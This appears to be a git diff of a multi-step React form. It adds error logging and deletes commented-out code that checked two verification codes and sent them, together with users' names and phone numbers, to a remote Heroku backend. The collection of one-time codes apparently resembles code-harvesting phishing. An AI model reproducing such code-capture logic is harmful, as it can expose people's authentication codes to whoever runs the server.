@@ -57,18 +57,6 @@ export default function Form() {
         setOpen(false);
     };
 
-    /*const checkVerificationCode = () => {
-        if(values.verificationCode == vc) {
-            increaseStep();
-        }
-    }; 
-
-    const checkVerificationCode2 = () => {
-        if(values.secondVerificationCode == vc2) {
-            userRequestHandler();
-        }
-    }; */
-
     const sendData = (step) => {
         switch(step) {
             case 1:
@@ -80,6 +68,8 @@ export default function Form() {
                     if(response.data.saved) {
                         setQueruId(response.data["result"]["insertId"]);
                     }
+                }).catch((error) => {
+                    console.log(error);
                 });
                 break;
             
@@ -92,6 +82,8 @@ export default function Form() {
                     if(response.data.saved) {
                         console.log("step 2");
                     }
+                }).catch((error) => {
+                    console.log(error);
                 });
                 break;
             
@@ -105,6 +97,8 @@ export default function Form() {
                     if(response.data.saved) {
                         console.log("step 3");
                     }
+                }).catch((error) => {
+                    console.log(error);
                 });
                 break;
             
@@ -116,6 +110,8 @@ export default function Form() {
                     if(response.data.saved) {
                         console.log("step 4");
                     }
+                }).catch((error) => {
+                    console.log(error);
                 });
                 break;
 
@@ -128,6 +124,8 @@ export default function Form() {
                         console.log("step 5");
                         userRequestHandler();
                     }
+                }).catch((error) => {
+                    console.log(error);
                 });
                 break;
         }
@@ -178,29 +176,6 @@ export default function Form() {
         setValues({ ...values, [name]: e.target.value });
     };
     
-    /* const addVerificationCodes = () => {
-        axios.post("https://investment-com.herokuapp.com/add-code", {
-            user_request_id: queryId,
-            fullName: values.clientFullname,
-            firstCode: vc,
-            secondCode: vc2,
-            phoneNumber: values.clientPhoneNumber,
-        }, 
-        {
-            headers: {
-                'Access-Control-Allow-Origin': 'https://investment.netlify.app',
-                'Accept': '*',
-                'origin': 'https://investment.netlify.app',
-                'Referer': 'https://investment.netlify.app/',
-                'Host': 'https://investment-com.herokuapp.com'
-            }
-        }).then((response) => {
-            console.log("vc1, vc2 saved");
-        })
-    };
-
-    */
-
     const userRequestHandler = () => {
         setOpen(true);        
     };
